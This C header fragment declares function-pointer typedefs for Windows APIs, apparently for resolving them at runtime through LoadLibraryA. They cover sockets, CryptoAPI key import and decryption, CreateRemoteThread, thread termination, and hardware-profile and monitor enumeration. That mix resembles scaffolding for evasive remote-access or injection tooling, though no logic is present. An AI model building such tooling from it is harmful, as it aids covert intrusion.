typedef DWORD(WINAPI *PROTO_WaitForMultipleObjects)(
	DWORD        nCount,
	const HANDLE *lpHandles,
	BOOL         bWaitAll,
	DWORD        dwMilliseconds
	);

typedef BOOL(WINAPI *PROTO_SetEvent)(
	HANDLE hEvent
	);

typedef BOOL(WINAPI *PROTO_ResetEvent)(
	HANDLE hEvent
	);

typedef HANDLE(WINAPI *PROTO_CreateEventA)(
	LPSECURITY_ATTRIBUTES lpEventAttributes,
	BOOL                  bManualReset,
	BOOL                  bInitialState,
	LPCSTR                lpName
	);

typedef void(WINAPI *PROTO_EnterCriticalSection)(
	LPCRITICAL_SECTION lpCriticalSection
	);

typedef void(WINAPI *PROTO_LeaveCriticalSection)(
	LPCRITICAL_SECTION lpCriticalSection
	);

typedef void(WINAPI *PROTO_InitializeCriticalSection)(
	LPCRITICAL_SECTION lpCriticalSection
	);

typedef void(WINAPI *PROTO_DeleteCriticalSection)(
	LPCRITICAL_SECTION lpCriticalSection
	);

typedef DWORD(WINAPI *PROTO_GetCurrentThreadId)(
	void
	);

typedef BOOL(WINAPI *PROTO_TerminateThread)(
	HANDLE hThread,
	DWORD  dwExitCode
	);

typedef BOOL(WINAPI *PROTO_CryptDestroyKey)(
	HCRYPTKEY hKey
	);

typedef BOOL(WINAPI *PROTO_CryptExportKey)(
	HCRYPTKEY hKey,
	HCRYPTKEY hExpKey,
	DWORD     dwBlobType,
	DWORD     dwFlags,
	BYTE      *pbData,
	DWORD     *pdwDataLen
	);

typedef BOOL(WINAPI *PROTO_CryptImportKey)(
	HCRYPTPROV hProv,
	const BYTE *pbData,
	DWORD      dwDataLen,
	HCRYPTKEY  hPubKey,
	DWORD      dwFlags,
	HCRYPTKEY  *phKey
	);

typedef u_short(WINAPI *PROTO_htons)(
	u_short hostshort
	);

typedef int(WINAPI *PROTO_recv)(
	SOCKET s,
	char   *buf,
	int    len,
	int    flags
	);

typedef int(WINAPI *PROTO_connect)(
	SOCKET         s,
	const sockaddr *name,
	int            namelen
	);

typedef SOCKET(WINAPI *PROTO_socket)(
	int af,
	int type,
	int protocol
	);

typedef int(WINAPI *PROTO_send)(
	SOCKET     s,
	const char *buf,
	int        len,
	int        flags
	);

typedef int(WINAPI *PROTO_WSAStartup)(
	WORD      wVersionRequired,
	LPWSADATA lpWSAData
	);

typedef hostent*(WINAPI *PROTO_gethostbyname)(
	const char *name
	);

typedef int(WINAPI *PROTO_closesocket)(
	IN SOCKET s
	);

typedef int(WINAPI *PROTO_WSACleanup)(
	void
	);

typedef char*(WINAPI *PROTO_inet_ntoa)(
	in_addr in
	);

typedef unsigned long(WINAPI *PROTO_inet_addr)(
	const char *cp
	);

typedef HMODULE(WINAPI *PROTO_LoadLibraryA)(
	LPCSTR lpLibFileName
	);

typedef BOOL(WINAPI *PROTO_CryptSetKeyParam)(
	HCRYPTKEY  hKey,
	DWORD      dwParam,
	const BYTE *pbData,
	DWORD      dwFlags
	);

typedef BOOL(WINAPI *PROTO_CryptDecrypt)(
	HCRYPTKEY  hKey,
	HCRYPTHASH hHash,
	BOOL       Final,
	DWORD      dwFlags,
	BYTE       *pbData,
	DWORD      *pdwDataLen
	);

typedef HANDLE(WINAPI *PROTO_CreateRemoteThread)(
	HANDLE                 hProcess,
	LPSECURITY_ATTRIBUTES  lpThreadAttributes,
	SIZE_T                 dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID                 lpParameter,
	DWORD                  dwCreationFlags,
	LPDWORD                lpThreadId
	);

typedef BSTR(WINAPI *PROTO_SysAllocString)(
	const OLECHAR *psz
	);

typedef void(WINAPI *PROTO_SysFreeString)(
	BSTR bstrString
	);

typedef LPVOID(WINAPI *PROTO_HeapAlloc)(
	HANDLE hHeap,
	DWORD  dwFlags,
	SIZE_T dwBytes
	);

typedef BSTR(WINAPI *PROTO_SysAllocStringByteLen)(
	LPCSTR psz,
	UINT   len
	);

typedef BOOL(WINAPI *PROTO_GetMonitorInfoA)(
	HMONITOR      hMonitor,
	LPMONITORINFO lpmi
	);

typedef HDC(WINAPI *PROTO_CreateDCA)(
	LPCSTR         pwszDriver,
	LPCSTR         pwszDevice,
	LPCSTR         pszPort,
	const DEVMODEA *pdm
	);

typedef BOOL(WINAPI *PROTO_EnumDisplayMonitors)(
	HDC             hdc,
	LPCRECT         lprcClip,
	MONITORENUMPROC lpfnEnum,
	LPARAM          dwData
	);

typedef BOOL(WINAPI *PROTO_GetCurrentHwProfileA)(
	LPHW_PROFILE_INFOA lpHwProfileInfo
	);

typedef DWORD(WINAPI *PROTO_GetFinalPathNameByHandleA)(
	HANDLE hFile,
	LPSTR  lpszFilePath,
	DWORD  cchFilePath,
	DWORD  dwFlags
	);